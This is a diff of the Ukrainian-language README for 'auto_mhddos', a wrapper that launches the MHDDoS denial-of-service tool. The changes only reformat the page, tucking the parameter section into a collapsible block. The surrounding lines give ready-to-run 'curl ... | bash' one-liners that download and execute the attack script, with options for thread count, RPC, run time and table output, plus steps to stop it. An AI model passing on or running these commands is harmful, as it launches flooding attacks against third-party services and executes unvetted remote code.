@@ -37,8 +37,9 @@ curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_b
 curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash -s --  4000
 ```
 
-## ❕Передача параметрів (ще не працює)
 
+<details>
+  <summary>Передача параметрів (тимчасово не працює)</summary>
 ```
 curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash -s -- -t 2000 --rpc 2000 -k 1 --table
 ```
@@ -50,9 +51,12 @@ curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_b
 `-k 1` - kill 1 hour. Завершити скрипт через 1 годину роботи
 
 `--table` - увімкнути режим відображення данних в таблиці
+</details>
 
 ## Зупинка скрипту
+
 1. Або просто зачинити термінал.
+
 2. Або в іншому терміналі виконати `pkill -f start.py; pkill -f runner.py` а потім натиснути CTRL+C у терміналі з скриптом.
 
 ## Запуск на Windows у powershell.
